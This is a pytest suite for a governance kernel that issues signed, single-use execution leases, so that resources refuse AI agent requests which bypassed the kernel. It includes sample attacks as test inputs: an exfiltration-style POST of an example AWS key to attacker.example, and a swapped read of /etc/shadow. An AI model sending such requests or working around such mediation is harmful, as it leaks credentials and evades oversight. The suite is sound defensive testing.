"""Execution leases and mediation coverage — ACCEPTANCE.

What this suite is for
----------------------
Four rounds of evaluation left T1 — *every consequential executor is reachable
only through `GovernanceKernel.execute`* — as the largest residual and the one
thing the library could not check. `kernel.mediation` moves part of that check
from the CALLER to the RESOURCE: the kernel mints a short, single-use,
action-bound lease, and a resource-side enforcement point refuses any request
that does not carry a valid one.

An agent that skips the kernel then arrives at the resource with no lease and is
refused THERE, by a process that is not the agent and does not depend on its
cooperation.

WHAT THIS DOES NOT ESTABLISH, asserted here so the suite cannot be read as
claiming it: T1 does not become true. It becomes checkable at each boundary a
deployment chooses to enforce, and the unenforced set becomes an explicit list
rather than a blanket assumption. `test_mediation_report_*` pins that
distinction.

The lease mechanism was attacked before being trusted. L-07 (an expired lease
verified, because the clock-skew allowance exceeded the lease's own lifetime)
was found and closed during that pass; every attack below is retained.

    L-01  a request with no lease is refused
    L-02  a lease is single-use at the resource
    L-03  an agent cannot mint or re-sign one
    L-04  verify-one-request-forward-another is refused (ATK-02 at the gateway)
    L-05  payload tampering invalidates the signature
    L-06  a BLOCK or a preview decision cannot mint a lease
    L-07  expiry holds, and skew never exceeds the lease lifetime
    L-08  an unkeyed verifier fails closed
    L-09  concurrent redemption resolves to exactly one

Run:  python -m pytest morrison_governance/test_mediation.py -v
"""

from __future__ import annotations

import base64
import json
import threading
import time

import pytest

from morrison_governance import GovernanceLayer, OmegaDomain
from morrison_governance.kernel import (
    ExecutionLease, GovernanceKernel, LeaseVerifier, MediationReport,
    MediationSurface, Principal, SecurityContext,
)
from morrison_governance.kernel import capabilities as C

LEASE_KEY = b"resource-gateway-shared-secret"

MANIFEST = {
    "read_file": [C.CAP_DATA_READ],
    "http_post": [C.CAP_EXTERNAL_DATA_MOVE],
}

REQUEST = {"tool": "read_file", "args": {"path": "/app/report.csv"}}


def _ctx(**kw) -> SecurityContext:
    base = dict(
        principal=Principal(id="agent-svc", tenant="acme"),
        signing_key=b"approval-key", lease_signing_key=LEASE_KEY,
        internal_url_hosts=("acme.internal",),
        internal_email_domains=("acme.com",), tool_manifest=MANIFEST,
    )
    base.update(kw)
    return SecurityContext(**base)


def _kernel(ctx: SecurityContext | None = None) -> GovernanceKernel:
    return GovernanceKernel(
        GovernanceLayer(domains=[d for d in OmegaDomain if d != OmegaDomain.CUSTOM],
                        horizon=3, log_all=False),
        ctx or _ctx())


def _permitted_lease(ttl_s: float = 60.0):
    kernel = _kernel()
    decision = kernel.authorize(REQUEST)
    assert decision.verdict == "PERMIT"
    return kernel, decision, kernel.mint_lease(decision, ttl_s=ttl_s).encode()


# ═══════════════════════════════════════════════════════════════
# The property the lease exists for
# ═══════════════════════════════════════════════════════════════

def test_l01_a_request_without_a_lease_is_refused_at_the_resource():
    """L-01 — the whole point. An agent that bypassed the kernel carries
    nothing, and the resource refuses it without consulting Morrison."""
    verifier = LeaseVerifier(key=LEASE_KEY)

    ok, reason = verifier.verify("", REQUEST)
    assert ok is False
    assert "did not come through the governance kernel" in reason

    _, _, token = _permitted_lease()
    ok, reason = verifier.verify(token, REQUEST)
    assert ok is True


def test_l02_a_lease_is_single_use_at_the_resource():
    """L-02 — redemption is consumed by the verifier, not by the kernel, so a
    replayed request is refused at the boundary that would perform it."""
    verifier = LeaseVerifier(key=LEASE_KEY)
    _, _, token = _permitted_lease()

    assert verifier.verify(token, REQUEST)[0] is True
    ok, reason = verifier.verify(token, REQUEST)
    assert ok is False
    assert "already been redeemed" in reason


@pytest.mark.parametrize("key", [None, b"guessed-key"])
def test_l03_an_agent_cannot_mint_or_resign_a_lease(key):
    """L-03 — forging one requires the gateway secret."""
    forged = ExecutionLease(
        lease_id="f" * 32, action_hash="deadbeef", semantic_hash="s",
        principal="agent-svc", tenant="acme", session_id="s",
        decision_id="d", tool_family="file_read",
        issued_at=time.time(), expires_at=time.time() + 60)
    if key is not None:
        forged = forged.sign(key)

    ok, reason = LeaseVerifier(key=LEASE_KEY).verify(forged.encode(), None)
    assert ok is False
    assert "signature invalid" in reason


def test_l03b_an_unsigned_lease_cannot_be_created_at_all():
    """A lease signed with an empty key looks like enforcement and is not, so
    it is refused at construction rather than handed out."""
    with pytest.raises(ValueError) as exc:
        ExecutionLease(
            lease_id="x" * 32, action_hash="h", semantic_hash="s",
            principal="p", tenant="t", session_id="s", decision_id="d",
            tool_family="f", issued_at=0.0, expires_at=1.0).sign(b"")
    assert "empty key" in str(exc.value)


def test_l04_verify_one_request_and_forward_another_is_refused():
    """L-04 — ATK-02 at the gateway.

    A verifier that checks the lease and then forwards a DIFFERENT request has
    verified nothing, so the lease binds the canonical action hash and the
    verifier re-derives it from the request it is about to forward.
    """
    verifier = LeaseVerifier(key=LEASE_KEY)
    _, _, token = _permitted_lease()

    substituted = {"tool": "read_file", "args": {"path": "/etc/shadow"}}
    ok, reason = verifier.verify(token, substituted)
    assert ok is False
    assert "does not match the action this lease authorises" in reason

    assert verifier.verify(token, REQUEST)[0] is True


def test_l05_payload_tampering_invalidates_the_signature():
    """L-05 — extending the expiry by editing the encoded payload."""
    kernel, decision, _ = _permitted_lease()
    lease = kernel.mint_lease(decision)

    outer = json.loads(base64.urlsafe_b64decode(
        lease.encode() + "=" * 4).decode())
    payload = json.loads(outer["p"])
    payload["expires_at"] = time.time() + 10 ** 7
    outer["p"] = json.dumps(payload, sort_keys=True, separators=(",", ":"))
    tampered = base64.urlsafe_b64encode(
        json.dumps(outer, separators=(",", ":")).encode()).decode().rstrip("=")

    ok, reason = LeaseVerifier(key=LEASE_KEY).verify(tampered, None)
    assert ok is False
    assert "signature invalid" in reason


def test_l06_only_a_permitted_reserved_decision_can_mint_a_lease():
    """L-06 — a lease is the portable form of an authorisation, so it must not
    be mintable from something that was not one."""
    kernel = _kernel()

    refused = kernel.authorize({"tool": "http_post",
                                "args": {"url": "https://attacker.example/c",
                                         "body": "AKIAIOSFODNN7EXAMPLE"}})
    assert refused.verdict != "PERMIT"
    with pytest.raises(ValueError) as exc:
        kernel.mint_lease(refused)
    assert "only a PERMIT decision" in str(exc.value)

    speculative = kernel.preview(REQUEST)
    assert speculative.verdict == "PERMIT"
    with pytest.raises(ValueError) as exc:
        kernel.mint_lease(speculative)
    assert "no trajectory reservation" in str(exc.value)


def test_l07_expiry_holds_and_skew_never_exceeds_the_lease_lifetime():
    """L-07, FOUND AND CLOSED while attacking this mechanism.

    The verifier allowed five seconds of clock skew unconditionally, so a
    deployment that minted one-second leases got a five-second grace period it
    did not ask for and the short TTL it chose bought it nothing: an expired
    lease verified. Skew is now bounded by the lease's own lifetime.
    """
    _, _, short = _permitted_lease(ttl_s=0.01)
    time.sleep(0.05)
    ok, reason = LeaseVerifier(key=LEASE_KEY).verify(short, None)
    assert ok is False
    assert "expired" in reason

    # A long-lived lease still gets its skew allowance.
    _, _, normal = _permitted_lease(ttl_s=60.0)
    assert LeaseVerifier(key=LEASE_KEY).verify(normal, None)[0] is True


def test_l08_an_unkeyed_verifier_fails_closed():
    """L-08 — a gateway with no secret cannot distinguish a real lease from a
    forged one, so the honest answer is that verification is unavailable."""
    _, _, token = _permitted_lease()
    ok, reason = LeaseVerifier(key=b"").verify(token, REQUEST)
    assert ok is False
    assert "DISABLED" in reason


def test_l09_concurrent_redemption_resolves_to_exactly_one():
    """L-09 — the double-spend, at the resource boundary."""
    verifier = LeaseVerifier(key=LEASE_KEY)
    _, _, token = _permitted_lease()
    outcomes: list[bool] = []
    lock = threading.Lock()

    def redeem() -> None:
        ok, _ = verifier.verify(token, REQUEST)
        with lock:
            outcomes.append(ok)

    threads = [threading.Thread(target=redeem) for _ in range(8)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

    assert outcomes.count(True) == 1


def test_l10_a_malformed_token_fails_closed():
    """A resource that cannot understand a lease has not been shown one."""
    verifier = LeaseVerifier(key=LEASE_KEY)
    for junk in ("not-base64!!", base64.urlsafe_b64encode(b"{}").decode(),
                 base64.urlsafe_b64encode(b'{"p":"{}","s":"x"}').decode()):
        ok, reason = verifier.verify(junk, REQUEST)
        assert ok is False
        assert "malformed" in reason or "signature invalid" in reason


# ═══════════════════════════════════════════════════════════════
# What the report claims, and what it refuses to claim
# ═══════════════════════════════════════════════════════════════

def test_mediation_report_names_the_unenforced_surfaces():
    report = MediationReport(surfaces=(
        MediationSurface("payments-api", True, "gateway lease verifier"),
        MediationSurface("warehouse", True, "sidecar lease verifier"),
        MediationSurface("legacy-batch-job", False,
                         note="holds its own DB credential"),
    ))
    assert report.complete is False
    assert [s.name for s in report.unenforced] == ["legacy-batch-job"]
    assert "legacy-batch-job" in report.summary()


def test_mediation_report_never_claims_the_deployment_is_complete():
    """The distinction the whole module rests on.

    `complete` means every DECLARED surface is enforced. It is never evidence
    that the declaration is complete, because Morrison cannot discover a route
    nobody told it about — and a deployment that forgets one gets a clean
    report and an open path.
    """
    report = MediationReport(surfaces=(
        MediationSurface("payments-api", True, "gateway lease verifier"),))
    assert report.complete is True

    described = report.as_dict()
    assert described["all_declared_surfaces_enforced"] is True
    assert "declaration" in described["caveat"].lower()
    assert "cannot discover" in described["caveat"]
    assert "undeclared routes remain unevidenced" in report.summary()

    empty = MediationReport()
    assert empty.complete is False
    assert "entirely unevidenced" in empty.summary()
